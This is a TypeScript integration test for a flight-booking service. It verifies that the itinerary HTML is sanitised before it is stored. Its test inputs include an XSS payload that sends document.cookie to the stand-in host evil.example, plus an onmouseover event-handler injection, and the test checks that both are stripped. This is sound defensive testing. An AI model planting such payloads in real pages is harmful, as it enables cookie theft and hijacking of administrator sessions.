import { afterAll, beforeAll, describe, expect, it } from "vitest";

import {
  AdminRole,
  BookingStatus,
  CustomerStatus,
  PassengerType,
  TicketStatus,
} from "@/generated/prisma/enums";
import { hashPassword } from "@/lib/auth/password";
import { prisma } from "@/lib/db/prisma";
import { createFlightBooking } from "@/server/services/booking-service";
import { flushPendingBookingEmails } from "@/server/services/customer-email-service";

/**
 * The itinerary editor's markup is stored as markup, so the only thing between
 * a crafted paste and script running in an administrator's session is the
 * sanitiser. Asserting it here, through the service, proves it is actually on
 * the write path — a unit test of the sanitiser alone would still pass if
 * nothing called it.
 */

const SUFFIX = Date.now();
let actorId: string;
let customerId: string;
const bookingIds: string[] = [];

async function make(itineraryHtml: string): Promise<string> {
  const { id } = await createFlightBooking(
    {
      booking: {
        customerId,
        status: BookingStatus.PENDING,
        priority: "NORMAL",
        ticketStatus: TicketStatus.PENDING,
        mcoStatus: "NOT_APPLICABLE",
        currency: "USD",
        splitCharges: false,
        itineraryHtml,
      } as never,
      amounts: {
        baseFareMinor: 1_000, taxesFeesMinor: 0, totalMinor: 1_000,
        supplierCostMinor: 900, grossMcoMinor: 1_000, netMcoMinor: 900,
      },
      passengers: [
        { firstName: "A", lastName: "B", type: PassengerType.ADULT },
      ] as never,
      segments: [
        {
          airline: "Delta", flightNumber: "DL1", origin: "JFK", destination: "LHR",
          departureAt: new Date("2027-03-01T18:00:00Z"),
          arrivalAt: new Date("2027-03-02T06:00:00Z"),
        } as never,
      ],
    },
    actorId,
  );
  bookingIds.push(id);
  return id;
}

async function storedHtml(bookingId: string): Promise<string | null> {
  const row = await prisma.flightDetail.findUniqueOrThrow({
    where: { bookingId },
    select: { itineraryHtml: true },
  });
  return row.itineraryHtml;
}

beforeAll(async () => {
  actorId = (await prisma.adminUser.create({
    data: {
      email: `itin-${SUFFIX}@example.invalid`, name: "Itinerary Actor",
      passwordHash: await hashPassword("irrelevant"), role: AdminRole.OPERATIONS,
    },
    select: { id: true },
  })).id;

  customerId = (await prisma.customer.create({
    data: {
      reference: `CUS-ITIN-${SUFFIX}`, firstName: "Itin", lastName: "Customer",
      email: `itin-cust-${SUFFIX}@example.invalid`, status: CustomerStatus.ACTIVE,
    },
    select: { id: true },
  })).id;
});

afterAll(async () => {
  await flushPendingBookingEmails();
  await prisma.auditLog.deleteMany({ where: { adminUserId: actorId } });
  await prisma.notification.deleteMany({ where: { bookingId: { in: bookingIds } } });
  await prisma.booking.deleteMany({ where: { id: { in: bookingIds } } });
  await prisma.customer.deleteMany({ where: { id: customerId } });
  await prisma.adminUser.deleteMany({ where: { id: actorId } });
});

describe("itinerary HTML on the write path", () => {
  it("keeps the formatting", async () => {
    const html = await storedHtml(await make("<p><strong>LHR</strong> → JFK</p>"));
    expect(html).toContain("<strong>LHR</strong>");
  });

  it("strips a script before it reaches the database", async () => {
    const html = await storedHtml(
      await make('<p>Trip</p><script>fetch("//evil.example?c="+document.cookie)</script>'),
    );

    expect(html).toContain("Trip");
    expect(html).not.toContain("script");
    expect(html).not.toContain("evil.example");
  });

  it("strips an event handler", async () => {
    const html = await storedHtml(await make('<p onmouseover="steal()">Trip</p>'));
    expect(html).not.toContain("onmouseover");
  });

  it("stores null for an untouched editor", async () => {
    expect(await storedHtml(await make("<p></p>"))).toBeNull();
  });
});
